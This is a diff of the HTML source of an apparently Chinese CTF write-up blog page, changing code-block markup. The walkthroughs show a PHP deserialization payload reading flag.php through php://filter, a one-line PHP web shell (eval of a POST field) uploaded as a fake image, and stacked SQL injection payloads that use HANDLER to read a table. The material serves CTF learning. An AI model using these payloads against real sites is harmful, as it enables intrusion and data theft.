-    }<span class="comment">//GET传参str，如果没有不可打印的字符，对该字符串进行反序列化</span>
+    $str &#x3D; (string)$_GET[&#39;str&#39;];
+    if(is_valid($str)) &#123;
+        $obj &#x3D; unserialize($str);
+    &#125;&#x2F;&#x2F;GET传参str，如果没有不可打印的字符，对该字符串进行反序列化
 
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>is_valid()函数</strong>对传入的$s进行检测，如果它的ASCII码值在32-25之间，才会返回true。即确定$s的字符都是能被打印的。</p>
 <p>经过上面代码审计，得知如果需要得到结果，在**__destruct()函数<strong>里要开始准备对op所传的参来绕过</strong>process()**方法，防止op被置于字符串1 可以传入$op&#x3D;2，所以通过在线php运行工具构造payload。因为这道题用的是protected，而protected会导致最后得到的序列化结果有些符号打印不出来，</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814610.png">所以我们可以改成public,</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814669.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">代码如下</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span> 
-<span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>{
-    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;
-    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>; 
-    <span class="keyword">public</span> <span class="variable">$content</span>;
-    }
-    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();
-        <span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
-        <span class="keyword">echo</span>(<span class="variable">$b</span>);
-<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php 
+class FileHandler&#123;
+    public $op &#x3D; 2;
+    public $filename &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;; 
+    public $content;
+    &#125;
+    $a &#x3D; new FileHandler();
+        $b&#x3D;serialize($a);
+        echo($b);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到结果</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814591.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> base64解码得到flag</p>
@@ -1179,7 +1176,7 @@ auto_prepend_file=xiaoma.jpg<span aria-hidden="true" class="line-numbers-rows"><
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815432.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">打开发现源码有提示</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815439.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">经过base32 - base64 解密得到线索</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815447.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
-<pre class="line-numbers language-highlight php">select * <span class="keyword">from</span> user where username = <span class="string"><code class="language-highlight php">select * <span class="keyword">from</span> user where username = <span class="string">&#x27;$name&#x27;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">select * from user where username &#x3D; &#39;$name&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再结合本题是SQL注入题，Fuzz测试一下</p>
 <p>发现or，order等都被过滤了，但是Order(没被过滤)可以绕过order。</p>
@@ -1197,7 +1194,7 @@ auto_prepend_file=xiaoma.jpg<span aria-hidden="true" class="line-numbers-rows"><
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817443.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以跟往常题一样，通过图片绕过</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817432.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现其对文件内容也有要求 </p>
 <p>所以换种php输入方法</p>
-<pre class="line-numbers language-highlight php">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string"><code class="language-highlight php">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</script><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">想着再通过.htaccess文件使蚁剑可以连接，发现对其也有限制</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817439.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">不过没事，这个原因可以通过BP抓包，然后将Content-Type 修改为image&#x2F;jpg就行</p>
@@ -1207,18 +1204,18 @@ auto_prepend_file=xiaoma.jpg<span aria-hidden="true" class="line-numbers-rows"><
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818016.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 只能尝试堆叠注入</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818984.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818976.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">本题为’闭合</p>
 <p>所以尝试堆叠注入查查库</p>
-<pre class="line-numbers language-highlight php"><span class="number">1</span><span class="string"><code class="language-highlight php"><span class="number">1</span><span class="string">&#x27;;show tables-- q</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;show tables-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818022.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看到线索了，直接查看Flaghere这个表</p>
-<pre class="line-numbers language-highlight php"><span class="number">1</span><span class="string"><code class="language-highlight php"><span class="number">1</span><span class="string">&#x27;;show columns from `FlagHere`-- q</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;show columns from &#96;FlagHere&#96;-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818001.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 再看看words表</p>
-<pre class="line-numbers language-highlight php"><span class="number">1</span><span class="string"><code class="language-highlight php"><span class="number">1</span><span class="string">&#x27;;show columns from `words`-- q</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;show columns from &#96;words&#96;-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818457.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">到这里尝试抓取flag也没法实现，也没法像随便注那道题那样解决，看网上大佬博客知道了还有<strong>Handler</strong>方法 </p>
 <p><strong>HANDLER … OPEN语句打开一个表<br> HANDLER … READ语句访问<br> HANDLER … CLOSE关闭一个表</strong></p>
 <p>由此我们可以构造payload</p>
-<pre class="line-numbers language-highlight php"><span class="number">1</span><span class="string"><code class="language-highlight php"><span class="number">1</span><span class="string">&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到flag </p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818447.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">  </p>
@@ -1467,9 +1464,6 @@ auto_prepend_file=xiaoma.jpg<span aria-hidden="true" class="line-numbers-rows"><
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
